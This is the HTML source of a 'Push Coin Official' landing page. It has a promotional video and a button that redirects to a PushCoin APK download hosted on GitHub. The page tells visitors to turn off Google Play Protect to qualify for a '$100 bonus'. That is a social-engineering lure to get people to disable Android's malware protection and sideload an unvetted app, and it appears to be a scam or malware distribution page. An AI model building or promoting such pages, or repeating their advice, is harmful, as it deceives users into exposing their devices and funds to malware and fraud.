<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Push Coin Official</title>
    <style>
        body{

            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
        }
        #container {
            width: 100%;
            max-width: 640px;
            text-align: center;
        }
        #videoContainer {
            position: relative;
            margin-top: 20px; /* Adjust margin to move video down */
        }
        #myVideo {
            width: 100%;
            height: auto;
        }
        .control-btn {
            position: absolute;
            background: rgba(0, 0, 0, 0.5);
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
            padding: 15px 20px;
            border-radius: 50%;
        }
        #playPauseBtn {
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        #fullscreenBtn {
            bottom: 10px;
            right: 10px;
        }
        .text-container {
            color: white;
            background: rgba(0, 0, 0, 0.7);
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 10px;
        }
        .text-container button {
            margin-top: 10px;
            padding: 10px;
            background: #007bff;
            border: none;
            color: #ffffff;
            cursor: pointer;
            font-size: 15px;
            border-radius: 5px;
        }
        .text-container button:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>
    <div id="container">
        <div class="text-container" style="background-color: #ffffff; color: #000; padding: 50px 20px;">
            <button id="textButton">Download PushCoin apk</button>
            <p style="padding-top: 30px;">Please Turn-Off Google Play protect first, For $100 bonus eligibility.</p>
        </div>
        <div id="videoContainer">
            <video id="myVideo" autoplay muted>
                <source src="video.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
            <button id="playPauseBtn" class="control-btn">▶</button>
            <button id="fullscreenBtn" class="control-btn">⛶</button>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            var video = document.getElementById('myVideo');
            var playPauseBtn = document.getElementById('playPauseBtn');
            var fullscreenBtn = document.getElementById('fullscreenBtn');
            var textButton = document.getElementById('textButton');

            // Toggle play/pause
            playPauseBtn.addEventListener('click', function() {
                if (video.paused) {
                    video.play();
                    playPauseBtn.textContent = '❚❚';
                } else {
                    video.pause();
                    playPauseBtn.textContent = '▶';
                }
            });

            // Toggle fullscreen
            fullscreenBtn.addEventListener('click', function() {
                if (!document.fullscreenElement) {
                    video.requestFullscreen().catch(err => {
                        alert(`Error attempting to enable full-screen mode: ${err.message} (${err.name})`);
                    });
                } else {
                    document.exitFullscreen();
                }
            });

            // Reset play/pause button on video end
            video.addEventListener('ended', function() {
                video.currentTime = 0;
                playPauseBtn.textContent = '▶';
            });

            // Text button click event
            textButton.addEventListener('click', function() {
                window.location.href = 'https://github.com/amalapou/app/raw/main/app/PushCoin/PushCoin.apk';
            });
        });
    </script>
</body>
</html>
